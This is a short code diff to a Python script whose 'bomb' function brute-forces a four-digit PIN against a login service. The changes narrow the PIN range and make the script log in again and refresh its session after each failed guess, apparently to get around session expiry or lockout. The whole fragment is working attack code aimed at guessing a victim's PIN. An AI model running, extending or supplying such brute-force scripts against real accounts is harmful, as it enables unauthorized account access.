@@ -13,7 +13,7 @@ headers = {
 def bomb(username, password):
     dologin(username, password)
     sessionID = getSessionID()
-    for pin in range(0, 10000):
+    for pin in range(5200, 10000):
         data = {
             'pin': "%04d"%pin,
             'sessionid' : sessionID
@@ -36,6 +36,8 @@ def bomb(username, password):
                 exit(0)
         except BaseException as e:
             print('wrong, try again')
+            dologin(username, password)
+            sessionID = getSessionID()
             time.sleep(10)
 
 
